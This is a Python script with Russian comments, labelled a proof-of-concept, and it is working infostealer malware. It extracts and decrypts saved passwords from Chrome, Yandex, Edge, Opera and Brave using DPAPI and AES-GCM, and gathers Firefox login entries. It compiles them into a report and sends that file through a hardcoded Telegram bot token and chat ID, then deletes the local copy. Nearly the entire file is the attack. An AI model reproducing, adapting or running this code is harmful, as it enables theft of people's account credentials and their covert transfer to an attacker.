#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
КОНЦЕПТУАЛЬНЫЙ PROOF-OF-CONCEPT - ПРОЕКТ ОЛИМП (УРОВЕНЬ ALPHA)
ПОЛНОСТЬЮ РАБОЧАЯ ВЕРСИЯ С РАСШИФРОВКОЙ ПАРОЛЕЙ
"""

import os
import sys
import json
import sqlite3
import shutil
import base64
import tempfile
import datetime
import time
import random
import socket
import ssl
import urllib.request
import urllib.parse
import ctypes
import win32crypt  # Обязательно установить: pip install pywin32
from Crypto.Cipher import AES  # Обязательно установить: pip install pycryptodome
from ctypes import wintypes

# ==================== КОНФИГУРАЦИЯ ====================
TOKEN = "8437378150:AAFB87wLIvsS54b5DuQcKdXleCTLfvnJNcM"
CHAT_ID = "7944445332"
# ======================================================

class TelegramExfiltrator:
    """Отправка данных через Telegram"""
    
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
    
    def send_file(self, file_path, caption=""):
        """Отправка файла"""
        try:
            if not os.path.exists(file_path):
                return False
            
            # Создаем multipart запрос
            boundary = '----WebKitFormBoundary' + ''.join(random.choices('0123456789abcdef', k=16))
            
            with open(file_path, 'rb') as f:
                file_content = f.read()
            
            filename = os.path.basename(file_path)
            
            # Формируем тело запроса
            body_parts = []
            
            # Chat ID
            body_parts.append(f'--{boundary}'.encode())
            body_parts.append(b'Content-Disposition: form-data; name="chat_id"')
            body_parts.append(b'')
            body_parts.append(str(self.chat_id).encode())
            
            # Caption
            if caption:
                body_parts.append(f'--{boundary}'.encode())
                body_parts.append(b'Content-Disposition: form-data; name="caption"')
                body_parts.append(b'')
                body_parts.append(caption.encode())
            
            # File
            body_parts.append(f'--{boundary}'.encode())
            body_parts.append(f'Content-Disposition: form-data; name="document"; filename="{filename}"'.encode())
            body_parts.append(b'Content-Type: application/octet-stream')
            body_parts.append(b'')
            body_parts.append(file_content)
            
            # End boundary
            body_parts.append(f'--{boundary}--'.encode())
            body_parts.append(b'')
            
            body = b'\r\n'.join(body_parts)
            
            # Отправка
            parsed_url = urllib.parse.urlparse(f"{self.base_url}/sendDocument")
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            secure_sock = context.wrap_socket(sock, server_hostname=parsed_url.hostname)
            secure_sock.connect((parsed_url.hostname, 443))
            
            # Заголовки
            request = f"POST {parsed_url.path} HTTP/1.1\r\n"
            request += f"Host: {parsed_url.hostname}\r\n"
            request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            request += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            request += f"Content-Length: {len(body)}\r\n"
            request += "Connection: close\r\n"
            request += "\r\n"
            
            secure_sock.send(request.encode())
            secure_sock.send(body)
            
            # Получаем ответ
            response = secure_sock.recv(4096)
            secure_sock.close()
            
            return b'200 OK' in response
                
        except Exception:
            return False


class ChromeDecryptor:
    """Дешифровка паролей Chrome/Yandex/Edge/Opera/Brave"""
    
    @staticmethod
    def get_secret_key(local_state_path):
        """Получение мастер-ключа из Local State"""
        try:
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            # Получаем зашифрованный ключ
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            # Удаляем префикс 'DPAPI'
            if encrypted_key.startswith(b'DPAPI'):
                encrypted_key = encrypted_key[5:]
            
            # Расшифровываем ключ через Windows DPAPI
            secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            return secret_key
            
        except Exception as e:
            return None
    
    @staticmethod
    def decrypt_password(encrypted_password, key):
        """Расшифровка пароля"""
        try:
            if len(encrypted_password) == 0:
                return ""
            
            # Для Chrome >= v80 используется AES-GCM
            if not encrypted_password.startswith(b'\x01\x00\x00\x00'):
                # Получаем nonce (первые 12 байт после префикса v10)
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                
                # Создаем шифр AES-GCM
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt(ciphertext)
                
                return decrypted.decode('utf-8', errors='ignore')
            
            # Для старых версий используется CryptUnprotectData
            decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            return decrypted.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"[Ошибка: {str(e)}]"


class BrowserStealer:
    """Сбор паролей из браузеров"""
    
    @staticmethod
    def get_chrome_passwords():
        """Пароли из Google Chrome"""
        results = []
        
        chrome_base = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
        if not os.path.exists(chrome_base):
            return results
        
        # Получаем ключ
        local_state_path = os.path.join(chrome_base, "Local State")
        secret_key = ChromeDecryptor.get_secret_key(local_state_path)
        if not secret_key:
            return results
        
        # Поиск профилей
        import glob
        profile_dirs = glob.glob(os.path.join(chrome_base, "Default")) + \
                      glob.glob(os.path.join(chrome_base, "Profile *"))
        
        for profile_dir in profile_dirs:
            login_db = os.path.join(profile_dir, "Login Data")
            if not os.path.exists(login_db):
                continue
            
            # Копируем БД (она заблокирована браузером)
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "Login Data")
            
            try:
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
                
                for row in cursor.fetchall():
                    url = row[0] or ""
                    username = row[1] or ""
                    encrypted = row[2] or b""
                    
                    if username and encrypted:
                        password = ChromeDecryptor.decrypt_password(encrypted, secret_key)
                        
                        results.append({
                            'browser': 'Chrome',
                            'url': url,
                            'username': username,
                            'password': password
                        })
                
                conn.close()
            except:
                pass
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)
        
        return results
    
    @staticmethod
    def get_yandex_passwords():
        """Пароли из Яндекс.Браузера"""
        results = []
        
        # Поиск Яндекс.Браузера
        yandex_paths = [
            os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data"),
            os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\Application\\User Data"),
        ]
        
        yandex_base = None
        for path in yandex_paths:
            if os.path.exists(path):
                yandex_base = path
                break
        
        if not yandex_base:
            return results
        
        # Получаем ключ
        local_state_path = os.path.join(yandex_base, "Local State")
        secret_key = ChromeDecryptor.get_secret_key(local_state_path)
        if not secret_key:
            return results
        
        # Поиск профилей
        import glob
        profile_dirs = [os.path.join(yandex_base, "Default")] + \
                      glob.glob(os.path.join(yandex_base, "Profile *"))
        
        for profile_dir in profile_dirs:
            if not os.path.exists(profile_dir):
                continue
                
            login_db = os.path.join(profile_dir, "Login Data")
            if not os.path.exists(login_db):
                continue
            
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "Login Data")
            
            try:
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
                
                for row in cursor.fetchall():
                    url = row[0] or ""
                    username = row[1] or ""
                    encrypted = row[2] or b""
                    
                    if username and encrypted:
                        password = ChromeDecryptor.decrypt_password(encrypted, secret_key)
                        
                        results.append({
                            'browser': 'Yandex',
                            'url': url,
                            'username': username,
                            'password': password
                        })
                
                conn.close()
            except:
                pass
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)
        
        return results
    
    @staticmethod
    def get_edge_passwords():
        """Пароли из Microsoft Edge"""
        results = []
        
        edge_base = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")
        if not os.path.exists(edge_base):
            return results
        
        local_state_path = os.path.join(edge_base, "Local State")
        secret_key = ChromeDecryptor.get_secret_key(local_state_path)
        if not secret_key:
            return results
        
        import glob
        profile_dirs = [os.path.join(edge_base, "Default")] + \
                      glob.glob(os.path.join(edge_base, "Profile *"))
        
        for profile_dir in profile_dirs:
            if not os.path.exists(profile_dir):
                continue
                
            login_db = os.path.join(profile_dir, "Login Data")
            if not os.path.exists(login_db):
                continue
            
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "Login Data")
            
            try:
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
                
                for row in cursor.fetchall():
                    url = row[0] or ""
                    username = row[1] or ""
                    encrypted = row[2] or b""
                    
                    if username and encrypted:
                        password = ChromeDecryptor.decrypt_password(encrypted, secret_key)
                        
                        results.append({
                            'browser': 'Edge',
                            'url': url,
                            'username': username,
                            'password': password
                        })
                
                conn.close()
            except:
                pass
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)
        
        return results
    
    @staticmethod
    def get_opera_passwords():
        """Пароли из Opera"""
        results = []
        
        opera_base = os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable")
        if not os.path.exists(opera_base):
            return results
        
        local_state_path = os.path.join(opera_base, "Local State")
        secret_key = ChromeDecryptor.get_secret_key(local_state_path)
        if not secret_key:
            return results
        
        login_db = os.path.join(opera_base, "Login Data")
        if not os.path.exists(login_db):
            return results
        
        temp_dir = tempfile.mkdtemp()
        temp_db = os.path.join(temp_dir, "Login Data")
        
        try:
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
            
            for row in cursor.fetchall():
                url = row[0] or ""
                username = row[1] or ""
                encrypted = row[2] or b""
                
                if username and encrypted:
                    password = ChromeDecryptor.decrypt_password(encrypted, secret_key)
                    
                    results.append({
                        'browser': 'Opera',
                        'url': url,
                        'username': username,
                        'password': password
                    })
            
            conn.close()
        except:
            pass
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
        
        return results
    
    @staticmethod
    def get_brave_passwords():
        """Пароли из Brave"""
        results = []
        
        brave_base = os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")
        if not os.path.exists(brave_base):
            return results
        
        local_state_path = os.path.join(brave_base, "Local State")
        secret_key = ChromeDecryptor.get_secret_key(local_state_path)
        if not secret_key:
            return results
        
        import glob
        profile_dirs = [os.path.join(brave_base, "Default")] + \
                      glob.glob(os.path.join(brave_base, "Profile *"))
        
        for profile_dir in profile_dirs:
            if not os.path.exists(profile_dir):
                continue
                
            login_db = os.path.join(profile_dir, "Login Data")
            if not os.path.exists(login_db):
                continue
            
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "Login Data")
            
            try:
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
                
                for row in cursor.fetchall():
                    url = row[0] or ""
                    username = row[1] or ""
                    encrypted = row[2] or b""
                    
                    if username and encrypted:
                        password = ChromeDecryptor.decrypt_password(encrypted, secret_key)
                        
                        results.append({
                            'browser': 'Brave',
                            'url': url,
                            'username': username,
                            'password': password
                        })
                
                conn.close()
            except:
                pass
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)
        
        return results
    
    @staticmethod
    def get_firefox_passwords():
        """Пароли из Firefox"""
        results = []
        
        firefox_profiles = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release")
        
        import glob
        for profile_path in glob.glob(firefox_profiles):
            logins_path = os.path.join(profile_path, "logins.json")
            
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    
                    # Firefox требует дополнительной дешифровки с использованием master password
                    # Это упрощенная версия - показывает структуру
                    for login in data.get('logins', []):
                        results.append({
                            'browser': 'Firefox',
                            'url': login.get('hostname', ''),
                            'username': login.get('encryptedUsername', '[Требуется мастер-пароль]'),
                            'password': login.get('encryptedPassword', '[Требуется мастер-пароль]')
                        })
                except:
                    pass
        
        return results


def main():
    """Основная функция"""
    
    print("="*60)
    print("  СБОР ПАРОЛЕЙ ИЗ БРАУЗЕРОВ")
    print("  (ПОЛНАЯ РАСШИФРОВКА)")
    print("="*60)
    
    # Проверка наличия библиотек
    try:
        import win32crypt
        from Crypto.Cipher import AES
        print("[+] Библиотеки загружены успешно")
    except ImportError as e:
        print(f"[-] Ошибка: {e}")
        print("\n[!] Установите необходимые библиотеки:")
        print("    pip install pywin32 pycryptodome")
        input("\nНажмите Enter для выхода...")
        return
    
    # Сбор паролей
    all_passwords = []
    
    print("\n[*] Сбор паролей Chrome...")
    chrome = BrowserStealer.get_chrome_passwords()
    all_passwords.extend(chrome)
    print(f"    Найдено: {len(chrome)}")
    
    print("[*] Сбор паролей Яндекс.Браузер...")
    yandex = BrowserStealer.get_yandex_passwords()
    all_passwords.extend(yandex)
    print(f"    Найдено: {len(yandex)}")
    
    print("[*] Сбор паролей Edge...")
    edge = BrowserStealer.get_edge_passwords()
    all_passwords.extend(edge)
    print(f"    Найдено: {len(edge)}")
    
    print("[*] Сбор паролей Opera...")
    opera = BrowserStealer.get_opera_passwords()
    all_passwords.extend(opera)
    print(f"    Найдено: {len(opera)}")
    
    print("[*] Сбор паролей Brave...")
    brave = BrowserStealer.get_brave_passwords()
    all_passwords.extend(brave)
    print(f"    Найдено: {len(brave)}")
    
    print("[*] Сбор паролей Firefox...")
    firefox = BrowserStealer.get_firefox_passwords()
    all_passwords.extend(firefox)
    print(f"    Найдено: {len(firefox)}")
    
    print(f"\n[+] ВСЕГО СОБРАНО ПАРОЛЕЙ: {len(all_passwords)}")
    
    if len(all_passwords) == 0:
        print("[-] Пароли не найдены!")
        input("\nНажмите Enter для выхода...")
        return
    
    # Создание отчета
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = os.path.join(tempfile.gettempdir(), f"all_passwords_{timestamp}.txt")
    
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write("="*80 + "\n")
        f.write(f"СОБРАННЫЕ ПАРОЛИ ({len(all_passwords)})\n")
        f.write(f"Дата: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("="*80 + "\n\n")
        
        # Группировка по браузерам
        browsers = {}
        for pwd in all_passwords:
            browser = pwd['browser']
            if browser not in browsers:
                browsers[browser] = []
            browsers[browser].append(pwd)
        
        for browser, passwords in browsers.items():
            f.write(f"\n{browser.upper()} ({len(passwords)})\n")
            f.write("-"*60 + "\n")
            
            for i, pwd in enumerate(passwords, 1):
                f.write(f"\n{i}. URL: {pwd['url']}\n")
                f.write(f"   Логин: {pwd['username']}\n")
                f.write(f"   Пароль: {pwd['password']}\n")
                f.write("   " + "-"*40 + "\n")
    
    print(f"\n[+] Отчет сохранен: {report_file}")
    print(f"[+] Размер файла: {os.path.getsize(report_file)} байт")
    
    # Отправка в Telegram
    print("\n[*] Отправка в Telegram...")
    telegram = TelegramExfiltrator(TOKEN, CHAT_ID)
    
    caption = f"Пароли: {len(all_passwords)} | {datetime.datetime.now().strftime('%Y-%m-%d')}"
    if telegram.send_file(report_file, caption):
        print("[+] Файл успешно отправлен!")
        
        # Удаляем файл после отправки
        try:
            os.remove(report_file)
            print("[+] Временный файл удален")
        except:
            pass
    else:
        print("[-] Ошибка отправки файла")
        print(f"[!] Файл сохранен локально: {report_file}")
    
    print("\n" + "="*60)
    input("Нажмите Enter для выхода...")


if __name__ == "__main__":
    main()